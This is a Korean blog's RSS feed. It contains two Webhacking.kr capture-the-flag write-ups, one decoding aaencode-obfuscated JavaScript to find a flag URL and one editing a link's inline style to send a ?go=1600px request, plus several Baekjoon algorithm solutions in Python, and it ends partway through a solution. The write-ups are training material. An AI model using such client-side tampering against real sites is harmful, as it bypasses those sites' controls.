<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LRTK Blog</title>
    <link>https://lrtk-coder.github.io/</link>
    
    <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Coding, Security, IT News 등 정리한 블로그</description>
    <pubDate>Tue, 18 May 2021 20:50:37 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Webhackimg.kr Old - 12 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/18/Webhackimg-kr-Old-12-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/18/Webhackimg-kr-Old-12-Write-Up/</guid>
      <pubDate>Tue, 18 May 2021 11:49:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-12"><a href="#Old-12" class="headerlink" title="Old - 12"></a>Old - 12</h2><p><img src="/images/pasted-408.png"><br>Js challenge라고 하니, 개발자 코드로 살펴봤다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;;…</span><br></pre></td></tr></table></figure><p>엄청 많은 이모티콘으로 난독화된 JS를 볼 수 있었다.</p><p>이를 통해 JS 이모티콘 난독화를 검색해봤다.<br><br>그 결과 <a href="https://kkamikoon.tistory.com/165">자바스크립트 난독화Javascript Obfuscation 개념과 서비스 웹 페이지 :: 컴퓨터를 다루다</a> 블로그 글을 찾을 수 있었는데, 문제의 JS는 일본 이모티콘 난독화라는 것을 알 수 있었다.</p><p>블로그엔 난독화 인코딩 사이트만 있어서, 디코딩을 위해 다시 검색을 하였다.<br></p><blockquote><p><a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode - Decode encoded-as-aaencode JavaScript program. ‘_’</a><br><br>사이트의 이름이 aaencode demo라고 했으니, 이를 통해 aadecode라고 검색하니 찾을 수 있었다.</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> enco=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> enco2=<span class="number">126</span>;</span><br><span class="line"><span class="keyword">var</span> enco3=<span class="number">33</span>;</span><br><span class="line"><span class="keyword">var</span> ck=<span class="built_in">document</span>.URL.substr(<span class="built_in">document</span>.URL.indexOf(<span class="string">&#x27;=&#x27;</span>));</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">i=<span class="number">1</span>;i&lt;<span class="number">122</span>;i++</span>)</span>&#123;</span><br><span class="line">  enco=enco+<span class="built_in">String</span>.fromCharCode(i,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enco_</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> enco.charCodeAt(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( ck==<span class="string">&quot;=&quot;</span> + <span class="built_in">String</span>.fromCharCode(enco_(<span class="number">240</span>))</span><br><span class="line">+ <span class="built_in">String</span>.fromCharCode(enco_(<span class="number">220</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">232</span>))</span><br><span class="line">  + <span class="built_in">String</span>.fromCharCode(enco_(<span class="number">192</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">226</span>))</span><br><span class="line">+ <span class="built_in">String</span>.fromCharCode(enco_(<span class="number">200</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">204</span>))</span><br><span class="line">+ <span class="built_in">String</span>.fromCharCode(enco_(<span class="number">222</span>-<span class="number">2</span>))+<span class="built_in">String</span>.fromCharCode(enco_(<span class="number">198</span>))</span><br><span class="line">  + <span class="string">&quot;~~~~~~&quot;</span>+<span class="built_in">String</span>.fromCharCode(enco2)+<span class="built_in">String</span>.fromCharCode(enco3)) &#123;</span><br><span class="line">  location.href=<span class="string">&quot;./&quot;</span>+ck.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;&quot;</span>)+<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>난독화를 하는 위와 같은 코드가 나온다.<br><br>코드를 살펴보니, 가장 중요한 것은 Flag를 획득할 수 있는 if문이다.</p><p>fromCharCode 함수가 어떤 함수인지 알기위해 <a href="https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode() - JavaScript | MDN</a>을 참고하였다. UTF-16 코드 유닛의 시퀀스로부터 문자열을 생성해 반환하는 함수라고 한다.</p><p>65 -&gt; A로 변환하는 함수인데, if문을 보면 여러 fromCharCode 함수가 있는 것을 변환하여 서버에 요청하면 될 듯하다.</p><p><img src="/images/pasted-409.png"><br>필요한 코드들만 사용하여 flag를 얻을 수 있는 페이지를 찾을 수 있었다.</p><p><img src="/images/pasted-410.png"><br>Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/18/Webhackimg-kr-Old-12-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 10 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/18/Webhacking-kr-Old-10-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/18/Webhacking-kr-Old-10-Write-Up/</guid>
      <pubDate>Tue, 18 May 2021 09:14:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-10"><a href="#Old-10" class="headerlink" title="Old - 10"></a>Old - 10</h2><p><img src="/images/pasted-403.png"><br><img src="/images/pasted-404.png"><br>페이지를 보니, 엄청 긴 막대기 안에 O이 있고 Goal 라인이 있었다.</p><p>코드를 살펴보니, O은 a태그였고 Onclick 이벤트가 설정되어있었다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;hackme&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position:relative;left:0;top:0&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;this.style.left=parseInt(this.style.left,10)+1+&#x27;px&#x27;;if(this.style.left==&#x27;1600px&#x27;)this.href=&#x27;?go=&#x27;+this.style.left&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;this.innerHTML=&#x27;yOu&#x27;&quot;</span> <span class="attr">onmouseout</span>=<span class="string">&quot;this.innerHTML=&#x27;O&#x27;&quot;</span>&gt;</span>O<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Onclick 이벤트가 한 줄로 되어있어서 따로 빼서 보기 좋게 분류했다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.style.left=<span class="built_in">parseInt</span>(<span class="built_in">this</span>.style.left,<span class="number">10</span>)+<span class="number">1</span>+<span class="string">&#x27;px&#x27;</span></span><br><span class="line"><span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">this</span>.style.left==<span class="string">&#x27;1600px&#x27;</span></span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.href=<span class="string">&#x27;?go=&#x27;</span>+<span class="built_in">this</span>.style.left</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>클릭할 때마다 1px 씩 이동한다.<br><br>만약 O의 위치가 1600px이면, a 태그의 href 속성이 <code>?go=1600px</code>으로 된다.</p><p><img src="/images/pasted-405.png"><br>나는 일단 <code>?go=1600px</code>을 서버에 요청해봤다.<br><br>결과는 no hack이 출력되었다.</p><p>분명 코드에선 <code>?go=1600px</code>으로  이동하는데, 왜 안되는지 이해가 가지 않았다.<br><br>그래서 나는 O의 위치를 1600px로 이동시켜서 a태그로 이동해보려고 한다.</p><p><img src="/images/pasted-406.png"><br>O의 위치를 1599px로 이동하면 한칸 이동을 하여 <code>?go=1600px</code>를 요청하였다.</p><p><img src="/images/pasted-407.png"><br>flag를 획득할 수 있었다.</p><blockquote><p>왜 바로 요청하는건 안되는지는 이해가 되지 않는다.</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/18/Webhacking-kr-Old-10-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 실버 1002번 문제</title>
      <link>https://lrtk-coder.github.io/2021/05/18/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1002%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/05/18/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1002%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Tue, 18 May 2021 07:54:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;터렛&quot;&gt;&lt;a href=&quot;#터렛&quot; class=&quot;headerlink&quot; title=&quot;터렛&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/1002&quot;&gt;터렛&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;조규현과 백승환은 터렛에 근무하는 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="터렛"><a href="#터렛" class="headerlink" title="터렛"></a><a href="https://www.acmicpc.net/problem/1002">터렛</a></h1><p>조규현과 백승환은 터렛에 근무하는 직원이다. 하지만 워낙 존재감이 없어서 인구수는 차지하지 않는다. 다음은 조규현과 백승환의 사진이다.</p><p><img src="/images/pasted-402.png"></p><p>이석원은 조규현과 백승환에게 상대편 마린(류재명)의 위치를 계산하라는 명령을 내렸다. 조규현과 백승환은 각각 자신의 터렛 위치에서 현재 적까지의 거리를 계산했다.</p><p>조규현의 좌표 (x1, y1)와 백승환의 좌표 (x2, y2)가 주어지고, 조규현이 계산한 류재명과의 거리 r1과 백승환이 계산한 류재명과의 거리 r2가 주어졌을 때, 류재명이 있을 수 있는 좌표의 수를 출력하는 프로그램을 작성하시오.</p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">testCase = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(testCase):</span><br><span class="line">    x1, y1, r1, x2, y2, r2 = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    distance = ((x1 - x2)**<span class="number">2</span> + (y1 - y2)**<span class="number">2</span>) ** <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> distance == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> r1 == r2:</span><br><span class="line">            print(<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> distance &gt; r1 + r2:</span><br><span class="line">        print(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> distance == r1 + r2:</span><br><span class="line">        print(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> (r1 &lt; r2 <span class="keyword">and</span> r1 + distance == r2) <span class="keyword">or</span> (r2 &lt; r1 <span class="keyword">and</span> r2 + distance == r1):</span><br><span class="line">            print(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> (r1 &lt; r2 <span class="keyword">and</span> r1 + distance &lt; r2) <span class="keyword">or</span> (r2 &lt; r1 <span class="keyword">and</span> r2 + distance &lt; r1):</span><br><span class="line">            print(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>나는 문제를 읽고 무슨 소리인지 이해를 못했다.<br><br>직접 그림을 그리니, 그제서야 왜 예제에서 1과 2이 출력됬는지 이해가 됐다.</p><p>하지만 이해를 한다고 해서 문제가 풀린 것은 아니였다.</p><p>나는 문제를 풀지 못 했고, 다른 분의 풀이를 보고 이해를 하였다.</p><p><a href="https://www.youtube.com/watch?v=Y0mJyV0KVdw">알고리즘 문제풀이 - 백준 온라인(BOJ) 1002번 문제</a><br><br>이 분의 풀이 설명이 너무 자세하고 이해하기 쉬워서 풀이가 궁금하신 분들은 들어가서 확인하시면 될 것 같다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EC%8B%A4%EB%B2%84/">실버</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%844/">백준 실버4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/18/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1002%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 실버 7568번 문제</title>
      <link>https://lrtk-coder.github.io/2021/05/16/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-7568%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/05/16/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-7568%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Sun, 16 May 2021 12:16:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;덩치&quot;&gt;&lt;a href=&quot;#덩치&quot; class=&quot;headerlink&quot; title=&quot;덩치&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/7568&quot;&gt;덩치&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;우리는 사람의 덩치를 키와 몸무게,</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="덩치"><a href="#덩치" class="headerlink" title="덩치"></a><a href="https://www.acmicpc.net/problem/7568">덩치</a></h1><p>우리는 사람의 덩치를 키와 몸무게, 이 두 개의 값으로 표현하여 그 등수를 매겨보려고 한다. 어떤 사람의 몸무게가 x kg이고 키가 y cm라면 이 사람의 덩치는 (x, y)로 표시된다. 두 사람 A 와 B의 덩치가 각각 (x, y), (p, q)라고 할 때 x &gt; p 그리고 y &gt; q 이라면 우리는 A의 덩치가 B의 덩치보다 “더 크다”고 말한다. 예를 들어 어떤 A, B 두 사람의 덩치가 각각 (56, 177), (45, 165) 라고 한다면 A의 덩치가 B보다 큰 셈이 된다. 그런데 서로 다른 덩치끼리 크기를 정할 수 없는 경우도 있다. 예를 들어 두 사람 C와 D의 덩치가 각각 (45, 181), (55, 173)이라면 몸무게는 D가 C보다 더 무겁고, 키는 C가 더 크므로, “덩치”로만 볼 때 C와 D는 누구도 상대방보다 더 크다고 말할 수 없다.</p><p>N명의 집단에서 각 사람의 덩치 등수는 자신보다 더 “큰 덩치”의 사람의 수로 정해진다. 만일 자신보다 더 큰 덩치의 사람이 k명이라면 그 사람의 덩치 등수는 k+1이 된다. 이렇게 등수를 결정하면 같은 덩치 등수를 가진 사람은 여러 명도 가능하다. 아래는 5명으로 이루어진 집단에서 각 사람의 덩치와 그 등수가 표시된 표이다.</p><table><thead><tr><th>이름</th><th>(몸무게, 키)</th><th>덩치 등수</th></tr></thead><tbody><tr><td>A</td><td>(55, 185)</td><td>2</td></tr><tr><td>B</td><td>(58, 183)</td><td>2</td></tr><tr><td>C</td><td>(88, 186)</td><td>1</td></tr><tr><td>D</td><td>(60, 175)</td><td>2</td></tr><tr><td>E</td><td>(46, 155)</td><td>5</td></tr></tbody></table><p>위 표에서 C보다 더 큰 덩치의 사람이 없으므로 C는 1등이 된다. 그리고 A, B, D 각각의 덩치보다 큰 사람은 C뿐이므로 이들은 모두 2등이 된다. 그리고 E보다 큰 덩치는 A, B, C, D 이렇게 4명이므로 E의 덩치는 5등이 된다. 위 경우에 3등과 4등은 존재하지 않는다. 여러분은 학생 N명의 몸무게와 키가 담긴 입력을 읽어서 각 사람의 덩치 등수를 계산하여 출력해야 한다.</p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rankFunc</span>(<span class="params">data:<span class="built_in">list</span></span>):</span></span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        rank = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] &lt; j[<span class="number">0</span>] <span class="keyword">and</span> i[<span class="number">1</span>] &lt; j[<span class="number">1</span>]:</span><br><span class="line">                rank += <span class="number">1</span></span><br><span class="line">        result.append(rank)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    testCase = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    data = [<span class="built_in">tuple</span>(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(testCase)]</span><br><span class="line">    print(*rankFunc(data))</span><br></pre></td></tr></table></figure><h3 id="풀이-설명"><a href="#풀이-설명" class="headerlink" title="풀이 설명"></a>풀이 설명</h3><p>입력 받은 값들을 각 키와 몸무게 비교하여 작으면 랭크를 1 증가시켰다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EC%8B%A4%EB%B2%84/">실버</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%845/">백준 실버5</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/16/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-7568%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 실버 9020번 문제</title>
      <link>https://lrtk-coder.github.io/2021/05/16/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-9020%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/05/16/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-9020%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Sun, 16 May 2021 03:47:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;골드바흐의-추측&quot;&gt;&lt;a href=&quot;#골드바흐의-추측&quot; class=&quot;headerlink&quot; title=&quot;골드바흐의 추측&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://www.acmicpc.net/problem/9020&quot;&gt;골드바흐의 추측&lt;/a&gt;&lt;/h</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="골드바흐의-추측"><a href="#골드바흐의-추측" class="headerlink" title="골드바흐의 추측"></a><a href="https://www.acmicpc.net/problem/9020">골드바흐의 추측</a></h1><p>1보다 큰 자연수 중에서  1과 자기 자신을 제외한 약수가 없는 자연수를 소수라고 한다. 예를 들어, 5는 1과 5를 제외한 약수가 없기 때문에 소수이다. 하지만, 6은 6 = 2 × 3 이기 때문에 소수가 아니다.</p><p>골드바흐의 추측은 유명한 정수론의 미해결 문제로, 2보다 큰 모든 짝수는 두 소수의 합으로 나타낼 수 있다는 것이다. 이러한 수를 골드바흐 수라고 한다. 또, 짝수를 두 소수의 합으로 나타내는 표현을 그 수의 골드바흐 파티션이라고 한다. 예를 들면, 4 = 2 + 2, 6 = 3 + 3, 8 = 3 + 5, 10 = 5 + 5, 12 = 5 + 7, 14 = 3 + 11, 14 = 7 + 7이다. 10000보다 작거나 같은 모든 짝수 n에 대한 골드바흐 파티션은 존재한다.</p><p>2보다 큰 짝수 n이 주어졌을 때, n의 골드바흐 파티션을 출력하는 프로그램을 작성하시오. 만약 가능한 n의 골드바흐 파티션이 여러 가지인 경우에는 두 소수의 차이가 가장 작은 것을 출력한다.</p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeList</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    sieve = [<span class="literal">True</span>] * n</span><br><span class="line">    m = <span class="built_in">int</span>(n ** <span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+i, n, i):</span><br><span class="line">                sieve[j] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n) <span class="keyword">if</span> sieve[i] == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeSum</span>(<span class="params">n:<span class="built_in">int</span>, li:<span class="built_in">list</span></span>):</span></span><br><span class="line">    idx = <span class="built_in">max</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(li)) <span class="keyword">if</span> li[i] &lt;= n // <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span 